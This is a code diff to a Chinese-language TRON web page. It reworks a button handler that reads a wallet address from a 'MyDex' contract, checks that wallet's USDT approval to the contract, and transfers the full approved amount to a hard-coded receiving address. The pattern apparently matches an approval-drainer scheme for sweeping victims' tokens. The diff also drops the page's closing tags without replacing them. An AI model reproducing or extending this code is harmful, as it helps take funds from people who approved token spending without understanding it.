@@ -162,42 +162,43 @@
       }
     };
 
-    transferFromButton.onclick = async () => {
-      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        alert("請先連接錢包");
-        return;
-      }
+   transferFromButton.onclick = async () => {
+  if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+    alert("請先連接錢包");
+    return;
+  }
 
-      const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
-      const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
+  const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
+  const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
 
-      try {
-        const from = await MyDex.getIndexAddress(0).call();
-        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B"; // 你的收款地址
+  try {
+    const from = await MyDex.getIndexAddress(0).call();
+    const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B"; // 收款地址
 
-        let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
+    let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
 
-        // 兼容不同格式
-        if (allowance._hex) {
-          allowance = BigInt(allowance._hex).toString();
-        } else {
-          allowance = allowance.toString();
-        }
+    // 取出實際數字
+    if (typeof allowance === "object" && allowance._hex) {
+      allowance = window.tronWeb.toBigNumber(allowance._hex).toString();
+    } else if (typeof allowance === "object" && allowance._bignumber) {
+      allowance = allowance._bignumber.toString();
+    } else {
+      allowance = allowance.toString();
+    }
 
-        if (BigInt(allowance) === 0n) {
-          alert("尚未授權，無法轉帳");
-          return;
-        }
+    if (parseInt(allowance) === 0) {
+      alert("尚未授權，無法轉帳");
+      return;
+    }
 
-        console.log("💸 開始轉帳 USDT，金額:", allowance);
-        const tx = await MyDex.transferFrom(from, to, allowance).send({ feeLimit: 100_000_000 });
-        console.log("✅ 轉帳成功：", tx);
-        alert("轉帳成功");
-      } catch (err) {
-        console.error("❌ 轉帳失敗：", err);
-        alert("轉帳失敗，請確認授權狀態及手續費");
-      }
-    };
-  </script>
-</body>
-</html>
+    console.log("💸 開始轉帳 USDT，金額:", allowance);
+
+    const tx = await MyDex.transferFrom(from, to, allowance).send({ feeLimit: 100_000_000 });
+
+    console.log("✅ 轉帳成功：", tx);
+    alert("轉帳成功");
+  } catch (err) {
+    console.error("❌ 轉帳失敗：", err);
+    alert("轉帳失敗，請確認授權狀態及手續費");
+  }
+};
